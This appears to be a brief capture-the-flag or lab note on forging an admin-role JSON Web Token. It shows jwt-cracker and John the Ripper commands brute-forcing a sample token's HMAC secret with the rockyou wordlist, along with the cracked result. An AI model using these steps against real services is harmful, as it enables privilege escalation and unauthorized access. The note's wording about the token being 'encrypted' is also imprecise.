### JSON Web tokens

---

Task : We need to generate a JWT token having an admin role instead of having a user.

Sometimes the JWT is encrypted with some hashing algorithm, we need to break it using 'john the ripper' or other bruteforcing tool and reconstruct the jwt.

```py
% jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTMzODUzfQ.aDP5hVVQQN2uFQL15oTBG1B83j8MnQu0f7IRxodKm24 -d wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

SECRET FOUND: banana
Time taken (sec): 0.123
Total attempts: 20000
```
